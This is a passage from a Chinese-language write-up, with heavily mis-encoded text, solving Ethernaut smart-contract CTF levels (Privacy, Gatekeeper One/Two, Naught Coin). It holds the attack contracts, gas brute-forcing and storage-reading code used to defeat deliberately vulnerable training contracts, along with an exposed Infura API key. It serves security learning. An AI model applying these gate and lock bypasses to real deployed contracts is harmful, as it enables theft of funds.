&#125;//data[2]ä¸ºbytes32[2]ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦èŽ·å¾—privateçš„bytes32\n\n  /*\n    A bunch of super advanced solidity algorithms...\n\n      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`\n      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,\n      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\\n      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)\n      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU\n  */\n&#125;\n\nAnalyzeå­˜å‚¨æœºåˆ¶å­¦ä¹ â‘ \nå­˜å‚¨æœºåˆ¶å­¦ä¹ â‘¡\nå­˜å‚¨æœºåˆ¶å­¦ä¹ â‘¢\nå­˜å‚¨æœºåˆ¶å­¦ä¹ â‘£\nç›¸å¯¹åšvaulté‚£é“é¢˜æ—¶æ·±å…¥ç ”ç©¶äº†ä¸€ä¸‹å­˜å‚¨æ–¹å¼çš„é—®é¢˜ï¼šæ ¹æ® solidity æ–‡æ¡£ä¸­çš„å˜é‡å­˜å‚¨åŽŸåˆ™ï¼Œevm æ¯ä¸€æ¬¡å¤„ç† 32 ä¸ªå­—èŠ‚ï¼Œè€Œä¸è¶³ 32 å­—èŠ‚çš„å˜é‡ç›¸äº’å…±äº«å¹¶è¡¥é½ 32 å­—èŠ‚ã€‚(boolå 1å­—èŠ‚ä½†æ˜¯ç‹¬å ä¸€ä¸ªæ’æ§½ï¼Œuint256å’Œbytes32å 32å­—èŠ‚ï¼Œuint8,16,æ ¹æ®æ¯”ä¾‹å¯è®¡ç®—åˆ†åˆ«å æ®1ï¼Œ2å­—èŠ‚)\n)\nå˜é‡æŸ¥è¯¢ä»£ç \nfrom web3 import Web3,HTTPProvider\nimport json,binascii\nhttp = 'https://rinkeby.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab'\nweb3 = Web3(HTTPProvider(http))\nprint(binascii.b2a_hex(web3.eth.getStorageAt(\"0x1203d029Db225601f986253526D1a8bD662782A6\", \"0\")))\nprint(binascii.b2a_hex(web3.eth.getStorageAt(\"0x1203d029Db225601f986253526D1a8bD662782A6\", \"5\")))\n\né¢˜ç›®ä¸­è¦æ±‚ä¼ å…¥bytes16æ•°æ®ï¼Œå°†æ‰€å¾—çš„bytes32è½¬å˜æˆä¸ºbytes16ï¼Œç”¨åˆ°ä»¥ä¸‹åˆçº¦\nAttackcontract attack&#123;\n     Privacy target=Privacy(0x1203d029Db225601f986253526D1a8bD662782A6);\n     bytes16 public result; \n   function get(bytes32 trans)public&#123;\n       result=bytes16(trans);\n   &#125;\n     function pwn(bytes16 key)public&#123;\n         target.unlock(key);\n     &#125;\n &#125;\n\n13.Gatekeeper One\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šMake it past the gatekeeper and register as an entrant to pass this level.\nThings that might help:\n\nRemember what youâ€™ve learned from the Telephone and Token levels.\nYou can learn more about the special function gasleft(), in Solidityâ€™s documentation (see here and here).\n\nCodepragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract GatekeeperOne &#123;\n\n  using SafeMath for uint256;\n  address public entrant;\n\n  modifier gateOne() &#123;\n    require(msg.sender != tx.origin);\n    _;\n  &#125;//ä½¿ç”¨åˆçº¦è¿›è¡Œæ”»å‡»æ—¶tx.originä¸ºé’±åŒ…è´¦æˆ·åœ°å€ï¼Œmsg.senderä¸ºæ”»å‡»åˆçº¦åœ°å€ï¼Œpart oneå³å¯ç»•è¿‡\n\n  modifier gateTwo() &#123;\n    require(gasleft().mod(8191) == 0);\n    _;\n  &#125;//è™šæ‹Ÿæœºä¸­è¿›è¡Œdebugï¼Œä¼ å…¥gasä¸º8191ï¼Œè§‚å¯Ÿæ‰§è¡Œå®ŒgasåŽæ‰€å‰©ä½™gasï¼Œè®¡ç®—åœ¨æ­¤ä¹‹å‰æ¶ˆè€—çš„gasï¼Œåœ¨åŠ ä¸Š8191å³ä¸ºåº”ä¼ å…¥gas\n\n  modifier gateThree(bytes8 _gateKey) &#123;\n      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n      require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n      require(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\");\n    _;\n  &#125;//ç»•è¿‡æ­¤éƒ¨åˆ†çš„keyæž„é€ åœ¨æ”»å‡»åˆçº¦ä¸­ä»‹ç»\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;\n    entrant = tx.origin;\n    return true;\n  &#125;\n&#125;\n\nanalyzeé¦–å…ˆè¦äº†è§£ç±»åž‹è½¬æ¢æœºåˆ¶ï¼Œåœ¨è™šæ‹Ÿæœºä¸­éƒ¨ç½²ä¸€ä¸ªæµ‹è¯•åˆçº¦ï¼Œéšæ„å°†ä¸€ä¸²å­—ç¬¦è½¬æ¢æˆä¸ºbytes8æ ¼å¼\nå¹¶åˆ†åˆ«å°†å…¶è½¬å˜ä¸ºuint64(result),uint32(uint64(result)),uint16(uint64(result))è¿›è¡Œæµ‹è¯•\næµ‹è¯•åˆçº¦\npragma solidity ^0.6.0;\ncontract test &#123;\n    bytes8 public result=bytes8(keccak256(\"abc\"));\n    function trans(bytes8 b)public view returns(uint)&#123;\n        return uint64(b);\n    &#125;\n    function trans1(bytes8 a)public view returns(uint)&#123;\n        return uint32(uint64(a));\n    &#125;\n    function trans3(bytes8 c)public view returns(uint)&#123;\n       return uint16(uint64(c));\n    &#125;\n     function trans4()public view returns(uint)&#123;\n        return uint8(tx.origin);\n    &#125;\n&#125;\n\nè½¬æ¢ç»“æžœ\n\nbytes8åŒ…æ‹¬äº†16ä¸ªå­—æ¯åŠ æ•°å­—ï¼Œbytes8ä¸Žuint64æ‰€å å­—èŠ‚æ•°ç›¸åŒï¼Œé€šè¿‡è½¬æ¢ä»¥åŠåœ¨çº¿è¿›åˆ¶è½¬æ¢å¯ä»¥çŸ¥é“uint64(result)ç›¸å½“äºŽbytes8å³åŽåå…­ä½,uint32(uint64(result))ç›¸å½“äºŽbyte4å³åŽå…«ä½,uint16(uint64(result))ç›¸å½“äºŽbytes2å³åŽå››ä½ã€ä»¥ä¸Šéƒ½æ˜¯åŽå‡ ä½ã€‘\næ‰€ä»¥æž„é€ ç”¨äºŽç»•è¿‡çš„keyå¯ä»¥è¿™æ ·æž„é€ ï¼šâ‘ æ ¹æ®gatethreeçš„ç¬¬ä¸€ä¸ªrequireå¯çŸ¥keyçš„åŽå››ä½åº”è¯¥å’ŒåŽå…«ä½ç›¸ç­‰å³0000xxxxâ‘¡æ ¹æ®gatethreeçš„ç¬¬äºŒä¸ªrequireå¯çŸ¥keyçš„åŽå…«ä½åº”è¯¥å’ŒåŽåå…­ä½(å…±åå…­ä½)ä¸ç›¸ç­‰å³å‰å…«ä½ä¸å…¨ä¸º0â‘¢æ ¹æ®gatethreeçš„ç¬¬ä¸‰ä¸ªrequireå¯çŸ¥keyçš„åŽå…«ä½åº”è¯¥å’Œtx.originçš„åŽå››ä½ç›¸ç­‰ã€‚æ‰€ä»¥æœ€ç»ˆæž„é€ çš„keyä¸º:  0x12345678000022ad   \nå­¦ä¹ gasleftå‡½æ•°ï¼šè¿™ä¸ªæ¯”è¾ƒå¥½ç†è§£ï¼Œå°±æ˜¯æ‰§è¡Œå®Œgasä¹‹åŽå‰©ä½™çš„gasï¼Œå¯ä»¥å†è™šæ‹Ÿæœºä¸­debugåŠŸèƒ½ä¸­è®¡ç®—ï¼Œä»¥ä¸‹æ˜¯æ“ä½œè¿‡ç¨‹\nå…ˆä¼ å…¥8191çš„gasé™åˆ¶\n\néƒ¨ç½²åˆçº¦å¹¶ä¼ å…¥åˆšæ‰æž„é€ çš„keyè¿›è¡Œæ”»å‡»ï¼Œæ­¤æ—¶äº¤æ˜“å¤±è´¥ï¼Œå¤åˆ¶ transaction hashè¿›è¡Œdebugï¼Œæ‰¾åˆ°æ‰§è¡Œå®ŒgasåŽçš„dup2ï¼Œå¯ä»¥çœ‹åˆ°å³å‰©ä½™çš„gasä¸º7940ï¼Œæ‰€ä»¥åœ¨æ­¤ä¹‹å‰æ¶ˆè€—çš„gasä¸º8191-7940&#x3D;251ï¼Œæ‰€ä»¥ä¼ å…¥çš„gasåº”è¯¥ä¸º81910+251&#x3D;82161\n\n\nç»¼ä¸Šå¯ä»¥å†™å‡ºæ”»å‡»åˆçº¦\ncontract attack&#123;\n    GatekeeperOne target=GatekeeperOne(0x019F6D74cc988e55802adc44BD4130A3AC9C29a9);\n    function pwn(bytes8 key)public&#123;\n         address(target).call&#123;gas:82161&#125;(abi.encodeWithSignature(\"enter(bytes8)\",key));\n    &#125;\n&#125;\nç»è¿‡å¤šæ¬¡å°è¯•åŽï¼Œå‡æœªé€šå…³ï¼Œå°è¯•æ›´æ¢ç¼–è¯‘å™¨ç‰ˆæœ¬ï¼Œç»“æžœå‘çŽ°æ¯æ¢ä¸€æ¬¡ç‰ˆæœ¬ï¼Œæ¶ˆè€—çš„gaséƒ½ä¸åŒ(æ¯”å¦‚0.6.0ç‰ˆæœ¬æ¶ˆè€—çš„æ˜¯251ï¼Œ0.4.18ç‰ˆæœ¬æ¶ˆè€—çš„æ˜¯242ï¼Œå¤§æ¦‚å¤„åœ¨200~300çš„åŒºé—´)ï¼ŒäºŽæ˜¯å¹²è„†æ¢ä¸ªå†™æ³•ï¼Œç›´æŽ¥è·‘å®Œ200~300ä»¥å†…æ‰€æœ‰æ•°å­—\ncontract attack&#123;\n    GatekeeperOne target=GatekeeperOne(0x0bE148c2fF43dD082Eac236aD6085262c176DF8A);\n    function pwn(bytes8 key)public&#123;\n        for(uint i=200;i&lt;=300;i++)&#123;\n         address(target).call&#123;gas:81910+i&#125;(abi.encodeWithSignature(\"enter(bytes8)\",key));\n        &#125;\n       &#125;\n&#125;\n\nè™šæ‹Ÿæœºä¸­å’Œé“¾ä¸Šæ¶ˆè€—çš„gasä¸ç›¸åŒï¼Œéœ€è¦ä½¿ç”¨åŒºå—é“¾æµè§ˆå™¨è¿›è¡Œè°ƒè¯•ï¼Œæ”»å‡»åˆçº¦æ”¹ä¸ºä»¥ä¸‹\npragma solidity ^0.6.0;\ncontract attack1&#123;\n    GatekeeperOne target=GatekeeperOne(0xc338d2a9C388AF974304eB36f7dE0CE39DeaC559);\n    function pwn(bytes8 key)public&#123;\n         address(target).call(abi.encodeWithSignature(\"enter(bytes8)\",key));\n       &#125;\n&#125;åœ¨åˆçº¦äº¤äº’æ—¶ï¼Œä»Žmetamaskä¸­è®¾ç½®gas limit\n\nç¬¬ä¸€æ¬¡gas limitè®¾ç½®ä¸º81910ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æžœ\n\nç¬¬äºŒæ¬¡è®¾ç½®gas limitä¸º81910-54095+81910&#x3D;109725ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æžœ\n\nç¬¬ä¸‰æ¬¡è®¾ç½®gas limitä¸º81910-81475+109725&#x3D;110160,å¾—åˆ°å¦‚ä¸‹ç»“æžœ\n\nç¬¬å››æ¬¡è®¾ç½®gas limitä¸º81910-81903+110160&#x3D;110167ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æžœ\n\n\n14.Gatekeeper Two\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šThis gatekeeper introduces a few new challenges. Register as an entrant to pass this level.\nThings that might help:\n\nRemember what youâ€™ve learned from getting past the first gatekeeper - the first gate is the same.\nThe assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contractâ€™s code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.\nThe ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start when approaching this challenge.\n\nCodepragma solidity ^0.6.0;\n\ncontract GatekeeperTwo &#123;\n\n  address public entrant;\n\n  modifier gateOne() &#123;\n    require(msg.sender != tx.origin);\n    _;\n  &#125;//ä½¿ç”¨åˆçº¦è°ƒç”¨å°±å¯ä»¥ç»•è¿‡\n\n  modifier gateTwo() &#123;\n    uint x;\n    assembly &#123; x := extcodesize(caller()) &#125;\n    require(x == 0);\n    _;\n  &#125;\n\n  modifier gateThree(bytes8 _gateKey) &#123;\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);\n    _;\n  &#125;//æŠŠ^å½“æˆæ¬¡æ–¹ç®—äº†åŠå¤©ä¸€ç›´å¤±è´¥ï¼ŒåŽæ¥æ‰äº†è§£åˆ°æ˜¯å¼‚æˆ–è¿ç®—(å› ä¸ºé¢˜ç›®è¦æ±‚æ˜¯è‹±æ–‡ï¼Œå¯¼è‡´æç¤ºæ²¡çœ‹æ‡‚)\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;\n    entrant = tx.origin;\n    return true;\n  &#125;\n&#125;\n\nAnalyzeè¿ç®—ç¬¦å·å­¦ä¹ \n\n\n\nPrecedence\nDescription\nOperator\n\n\n\n1\nPostfix increment and decrement\n++, --\n\n\n\nNew expression\n&#96;new \n\n\n\nArray subscripting\n&lt;array&gt;[&lt;index&gt;]\n\n\n\nMember access\n&lt;object&gt;.&lt;member&gt;\n\n\n\nFunction-like call\n&lt;func&gt;(&lt;args...&gt;)\n\n\n\nParentheses\n(&lt;statement&gt;)\n\n\n2\nPrefix increment and decrement\n++, --\n\n\n\nUnary plus and minus\n+, -\n\n\n\nUnary operations\ndelete\n\n\n\nLogical NOT\n!\n\n\n\nBitwise NOT\n~\n\n\n3\nExponentiation\n**\n\n\n4\nMultiplication, division and modulo\n*, /, %\n\n\n5\nAddition and subtraction\n+, -\n\n\n6\nBitwise shift operators\n&lt;&lt;, &gt;&gt;\n\n\n7\nBitwise AND\n&amp;\n\n\n8\nBitwise XOR\n^\n\n\n9\nBitwise OR\n&#96;\n\n\n10\nInequality operators\n&lt;, &gt;, &lt;=, &gt;=\n\n\n11\nEquality operators\n==, !=\n\n\n12\nLogical AND\n&amp;&amp;\n\n\n13\nLogical OR\n&#96;\n\n\n14\nTernary operator\n&lt;conditional&gt; ? &lt;if-true&gt; : &lt;if-false&gt;\n\n\n15\nAssignment operators\n=, &#96;\n\n\n16\nComma operator\n,\n\n\nassemblyå­¦ä¹ \n\n\n\næ“ä½œç \næ ‡è®°\nè§£é‡Š\n\n\n\nstop\n-\nåœæ­¢æ‰§è¡Œï¼Œç›¸å½“äºŽè¿”å›žï¼ˆ0,0)\n\n\nadd(x,y)\n\nx + y\n\n\nsub(x,y)\n\nx - y\n\n\nmul(x,y)\n\nx * y\n\n\ndiv(x,y)\n\nx &#x2F; y\n\n\nsdiv(x,y)\n\nx &#x2F; y ,å¯¹äºŽæœ‰ç¬¦å·æ•°ï¼Œç”¨è¡¥ç \n\n\nmod(x,y)\n\nx % y\n\n\nsmod(x,y)\n\nx % y,å¯¹äºŽæœ‰ç¬¦å·æ•°ï¼Œç”¨è¡¥ç \n\n\nexp(x,y)\n\nxçš„yæ¬¡æ–¹\n\n\nnot(x)\n\nï½žxï¼ŒæŒ‰ä½å–å\n\n\nlt(x,y)\n\nå¦‚æžœx &lt; y,è¿”å›ž1ï¼Œå¦åˆ™è¿”å›ž0\n\n\ngt(x,y)\n\nå¦‚æžœx &gt; y,è¿”å›ž1ï¼Œå¦åˆ™è¿”å›ž0\n\n\nslt(x,y)\n\nå¦‚æžœx &lt; y,è¿”å›ž1ï¼Œå¦åˆ™è¿”å›ž0,å¯¹äºŽæœ‰ç¬¦å·æ•°ï¼Œç”¨è¡¥ç \n\n\nsgt(x,y)\n\nå¦‚æžœx &gt; y,è¿”å›ž1ï¼Œå¦åˆ™è¿”å›ž0,å¯¹äºŽæœ‰ç¬¦å·æ•°ï¼Œç”¨è¡¥ç \n\n\neq(x,y)\n\nå¦‚æžœx &#x3D;&#x3D; y,è¿”å›ž1ï¼Œå¦åˆ™è¿”å›ž0\n\n\niszero(x)\n\nå¦‚æžœx &#x3D;&#x3D; 0,è¿”å›ž1ï¼Œå¦åˆ™è¿”å›ž0\n\n\nand(x,y)\n\nxå’ŒyæŒ‰ä½ä¸Ž\n\n\nor(x,y)\n\nxå’ŒyæŒ‰ä½æˆ–\n\n\nxor(x,y)\n\nxå’ŒyæŒ‰ä½å¼‚æˆ–\n\n\nbyte(n,x)\n\nxçš„ç¬¬nä½ï¼Œæœ€é‡è¦çš„æ˜¯ç¬¬0ä½\n\n\naddmod(x,y,m)\n\n(x + y) % mï¼Œå¯ä»¥æ˜¯ä»»æ„ç²¾åº¦çš„ç®—æœ¯\n\n\nmulmod(x,y,m)\n\n(x * y) % mï¼Œå¯ä»¥æ˜¯ä»»æ„ç²¾åº¦çš„ç®—æœ¯\n\n\nsignxtend(i,x)\n\nä»Žç¬¬ï¼ˆi * 8 +  7ï¼‰ä½å¼€å§‹æ•°æœ€å°‘ç­¾åä½æ•°ï¼Œæ¥æ‰©å±•ç­¾å\n\n\nkeccak256(p,n)\n\nkeccak(mem[pâ€¦(p+n)))\n\n\nsha3(p,n)\n\nsha3(mem[pâ€¦(p+n)))\n\n\njump(label)\n-\nè·³è½¬åˆ°labelæ ‡ç­¾ï¼ä»£ç ä½ç½®\n\n\njumpi(label, cond)\n-\nå¦‚æžœcondéžé›¶ï¼Œå°±è·³è½¬åˆ°labelæ ‡ç­¾\n\n\npc\n\nä»£ç çš„å½“å‰ä½ç½®\n\n\npop(x)\n-\nåˆ é™¤xæŽ¨å…¥çš„å…ƒç´ \n\n\ndup1 â€¦ dup16\n\næ‹·è´ç¬¬iä½çš„å…ƒç´ åˆ°æ ˆé¡¶ï¼ˆä»Žé¡¶ç«¯å¼€å§‹æ•°ï¼‰\n\n\nswap1 â€¦ swap16\n*\näº¤æ¢æ ˆé¡¶å’Œç¬¬iä½çš„å…ƒç´ \n\n\nmloadï¼ˆpï¼‰\n\nmem[p..(p+32))\n\n\nmstore(p, v)\n-\nmem[p..(p+32)) :&#x3D; v\n\n\nmstore8(p, v)\n-\nmem[p] :&#x3D; v &amp; 0xff - åªåˆ†é…ä¸€ä¸ªå­—èŠ‚\n\n\nsload(p)\n\nstorage[p]\n\n\nsstore(p, v)\n-\nstorage[p] :&#x3D; v\n\n\nmsize\n\nå†…å­˜çš„å¤§å°ï¼Œä¾‹å¦‚æœ€å¤§çš„å†…å­˜å¯è®¿é—®ç´¢å¼•\n\n\ngas\n\nå¯ç”¨çš„gasæ•°\n\n\naddress\n\nå½“å‰åˆçº¦ï¼æ‰§è¡Œä¸Šä¸‹æ–‡çš„åœ°å€\n\n\nbalance(a)\n\nåœ°å€açš„ä½™é¢ï¼Œå•ä½ä¸ºwei\n\n\ncaller\n\nè°ƒç”¨è€…ï¼ˆä¸åŒ…å«delegatecallï¼‰\n\n\ncallvalue\n\nå½“å‰è°ƒç”¨å‘é€çš„weiæ•°\n\n\ncalldataload(p)\n\nä»Žä½ç½®på¼€å§‹çš„è°ƒç”¨æ•°æ®ï¼ˆ32ä½ï¼‰\n\n\ncalldatasize\n\nè°ƒç”¨æ•°æ®çš„å¤§å°ï¼Œbytesä¸ºå•ä½\n\n\ncalldatacopy(t,f,s)\n-\nä»Žæ•°æ®ä½ç½®fï¼Œæ‹·è´sä½æ•°æ®ï¼Œåˆ°å†…å­˜ä½ç½®t\n\n\ncodesize\n\nå½“å‰åˆçº¦&#x2F;æ‰§è¡Œä¸Šä¸‹æ–‡çš„ä»£ç å¤§å°\n\n\ncodecopy(t,f,s)\n-\nä»Žä»£ç ä½ç½®fï¼Œæ‹·è´sä½æ•°æ®ï¼Œåˆ°å†…å­˜ä½ç½®t\n\n\nextcodesize(a)\n\nåœ°å€aå¤„ä»£ç çš„å¤§å°\n\n\nextcodecopy(a, t, f, s)\n-\nåƒcodecopy(t,f,s)ï¼Œä½†æ˜¯æ˜¯ä½ç½®aå¤„çš„ä»£ç \n\n\nreturndatasize\n\nä¸Šä¸ªè¿”å›žå€¼çš„æ•°æ®å¤§å°\n\n\nreturndatacopy(t, f, s)\n-\nåœ¨è¿”å›žæ•°æ®çš„ä½ç½®fæ‹·è´sä½ï¼Œåˆ°å†…å­˜ä½ç½®t\n\n\ncreate(v, p, s)\n\nç”¨ mem[p..(p+s))é•¿åº¦çš„ä»£ç ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„åˆçº¦ï¼Œå‘é€v weiçš„ä»¥å¤ªå¸ï¼Œå¹¶è¿”å›žåˆçº¦åœ°å€\n\n\ncreate2(v, n, p, s)\n\nç”¨ åœ°å€ä¸ºkeccak256(&lt; address &gt; . n . keccak256(mem[p..(p+s)))ï¼Œmem[p..(p+s))é•¿åº¦çš„ä»£ç ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„åˆçº¦ï¼Œå‘é€v weiçš„ä»¥å¤ªå¸ï¼Œå¹¶è¿”å›žåˆçº¦åœ°å€\n\n\ncall(g, a, v, in, insize, out, outsize)\n\nè°ƒç”¨åœ°å€aä¸Šçš„åˆçº¦ï¼Œå‚æ•°ä¸ºmem[in..(in+insize))ï¼Œæä¾›gçš„gasï¼Œv weiçš„ä»¥å¤ªå¸ï¼Œè¾“å‡ºåˆ°mem[out..(out+outsize))ï¼Œå¦‚æžœæˆåŠŸè¿”å›ž1ï¼Œå¤±è´¥ï¼ˆä¾‹å¦‚gasä¸è¶³ï¼‰è¿”å›ž0\n\n\ncallcode(g, a, v, in, insize, out, outsize)\n\nä¸Žcallç›¸åŒï¼Œä½†æ˜¯ä½¿ç”¨aå¤„çš„ä»£ç ï¼Œå¹¶åªèƒ½åœ¨å½“å‰åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œ\n\n\ndelegatecall(g, a, in, insize, out, outsize)\n\nä¸Žcallcodeç›¸åŒï¼Œä½†æ˜¯ä¿ç•™callerå’Œcallvalue\n\n\nstaticcall(g, a, in, insize, out, outsize)\n\nä¸Ž_call(g, a, 0, in, insize, out, outsize) _ç›¸åŒï¼Œä½†æ˜¯ä¸å…è®¸æ”¹å˜çŠ¶æ€\n\n\nreturn(p, s)\n-\nç»“æŸæ‰§è¡Œï¼Œè¿”å›žæ•°æ®mem[p..(p+s))\n\n\nrevert(p, s)\n-\nç»“æŸæ‰§è¡Œï¼Œæ¢å¤çŠ¶æ€å˜åŒ–ï¼Œè¿”å›žæ•°æ®mem[p..(p+s))\n\n\nselfdestruct(a)\n-\nç»“æŸæ‰§è¡Œï¼Œé”€æ¯å½“å‰åˆçº¦ï¼Œå¹¶æŠŠä½™é¢å‘é€ç»™aåœ°å€\n\n\ninvalid\n-\nç”¨invalidæŒ‡ä»¤ç»“æŸæ‰§è¡Œ\n\n\nlog0(p,s)\n-\nè®°å½•æ—¥å¿—ï¼Œä¸åŒ…å«ä¸»é¢˜ï¼Œæ•°æ®ä¸ºmem[p..(p+s)\n\n\nlog1(p,s,t1)\n-\nè®°å½•æ—¥å¿—ï¼ŒåŒ…å«ä¸»é¢˜t1ï¼Œæ•°æ®ä¸ºmem[p..(p+s)\n\n\nlog2(p,s,t1,t2)\n-\nè®°å½•æ—¥å¿—ï¼ŒåŒ…å«ä¸»é¢˜t1ï¼Œt2ï¼Œæ•°æ®ä¸ºmem[p..(p+s)\n\n\nlog3(p,s,t1,t2,t3)\n-\nè®°å½•æ—¥å¿—ï¼ŒåŒ…å«ä¸»é¢˜t1ï¼Œt2ï¼Œt3ï¼Œæ•°æ®ä¸ºmem[p..(p+s)\n\n\nlog4(p,s,t1,t2,t3,t4)\n-\nè®°å½•æ—¥å¿—ï¼ŒåŒ…å«ä¸»é¢˜t1ï¼Œt2ï¼Œt3ï¼Œt4ï¼Œæ•°æ®ä¸ºmem[p..(p+s)\n\n\norigin\n\näº¤æ˜“å‘èµ·æ–¹\n\n\ngasprice\n\näº¤æ˜“çš„gasä»·æ ¼\n\n\nblockhash(b)\n\nåŒºå—åºåˆ—ä¸ºbçš„hash - åªèƒ½èŽ·å–åˆ°å½“å‰å—çš„æœ€è¿‘256å—\n\n\ncoinbase\n\nå½“å‰çš„çŸ¿å·¥æ”¶ç›Š\n\n\ntimestamp\n\nè‡ªåˆ›ä¸–çºªåŒºå—ä»¥æ¥çš„æ—¶é—´æˆ³ï¼Œå•ä½ä¸ºç§’\n\n\nnumber\n\nå½“å‰åŒºå—çš„åºå·\n\n\ndifficulty\n\nå½“å‰åŒºå—çš„éš¾åº¦\n\n\ngaslimit\n\nå½“å‰ä»£ç å—çš„gasé™åˆ¶\n\n\nå­¦ä¹ åˆ°extcodesize(caller())æ˜¯ä¸€ç§æ£€éªŒåˆçº¦åœ°å€è¿˜æ˜¯è´¦æˆ·åœ°å€çš„æ“ä½œï¼Œå¦‚æžœcallerä¸ºè´¦æˆ·åˆ™extcodesize(caller())ä¸º0ï¼Œå¦‚æžœcallerä¸ºåˆçº¦åˆ™extcodesize(caller())ä¸ºå¯¹åº”çš„å­—èŠ‚ç ï¼Œå¦‚ä¸‹ä¸ºæµ‹è¯•åˆçº¦\ncontract test&#123;\n    \n    function a() public view returns(uint )&#123;\n        uint x;\n   assembly &#123; \n       x := extcodesize(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4)\n   &#125;\n   return x;\n    &#125;\n    function b() public view returns(uint)&#123;\n        uint y;\n        assembly &#123;\n            y:=extcodesize(0x4a9C121080f6D9250Fc0143f41B595fD172E31bf)\n        &#125;\n        return y;\n    &#125;\n&#125;\n\næµ‹è¯•ç»“æžœä¸ºå¦‚ä¸‹\n\n&#x3D;&#x3D;è¿›ä¸€æ­¥äº†è§£å¾—çŸ¥ï¼šåˆçº¦åœ¨åˆå§‹åŒ–ï¼Œä»£ç å¤§å°ä¸º0ã€‚å³éœ€è¦å°†æ”»å‡»è¿‡ç¨‹å†™åœ¨constuctorä¸­&#x3D;&#x3D;\nAttackcontract attack&#123;\n    GatekeeperTwo public target=GatekeeperTwo(0xfD6a4183eed0115CBe743c480eA4042C15F0a86c);\n    bytes8 public result;\n    constructor() public&#123;\n        result = bytes8(0xffffffffffffffff ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));\n        target.enter(result);\n    &#125;\n&#125;\n\n15.Naught Coin\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šNaughtCoin is an ERC20 token and youâ€™re already holding all of them. The catch is that youâ€™ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.\n Things that might help\n\nThe ERC20 Spec\nThe OpenZeppelin codebase\n\nCodepragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/token/ERC20/ERC20.sol';\n\n contract NaughtCoin is ERC20 &#123;\n\n  // string public constant name = 'NaughtCoin';\n  // string public constant symbol = '0x0';\n  // uint public constant decimals = 18;\n  uint public timeLock = now + 10 * 365 days;\n  uint256 public INITIAL_SUPPLY;\n  address public player;\n\n  constructor(address _player) \n  ERC20('NaughtCoin', '0x0')\n  public &#123;\n    player = _player;\n    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));\n    // _totalSupply = INITIAL_SUPPLY;\n    // _balances[player] = INITIAL_SUPPLY;\n    _mint(player, INITIAL_SUPPLY);\n    emit Transfer(address(0), player, INITIAL_SUPPLY);\n  &#125;\n  \n  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;\n    super.transfer(_to, _value);\n  &#125;\n\n  // Prevent the initial owner from transferring tokens until the timelock has passed\n  modifier lockTokens() &#123;\n    if (msg.sender == player) &#123;\n      require(now > timeLock);\n      _;\n    &#125; else &#123;\n     _;\n    &#125;\n  &#125; \n&#125; \n\nerc20.sol\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\nimport \"./extensions/IERC20Metadata.sol\";\nimport \"../../utils/Context.sol\";\ncontract ERC20 is Context, IERC20, IERC20Metadata &#123;\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n    constructor(string memory name_, string memory symbol_) &#123;\n        _name = name_;\n        _symbol = symbol_;\n    &#125;\n    function name() public view virtual override returns (string memory) &#123;\n        return _name;\n    &#125;\n    function symbol() public view virtual override returns (string memory) &#123;\n        return _symbol;\n    &#125;\n    function decimals() public view virtual override returns (uint8) &#123;\n        return 18;\n    &#125;\n    function totalSupply() public view virtual override returns (uint256) &#123;\n        return _totalSupply;\n    &#125;\n    function balanceOf(address account) public view virtual override returns (uint256) &#123;\n        return _balances[account];\n    &#125;\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) &#123;\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    &#125;\n    function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;\n        return _allowances[owner][spender];\n    &#125;\n    function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;\n        _approve(_msgSender(), spender, amount);\n        return true;\n    &#125;\n    function transferFrom(address sender,address recipient,uint256 amount) public virtual override returns (bool) &#123;\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        if (currentAllowance != type(uint256).max) &#123;\n            require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n            unchecked &#123;\n                _approve(sender, _msgSender(), currentAllowance - 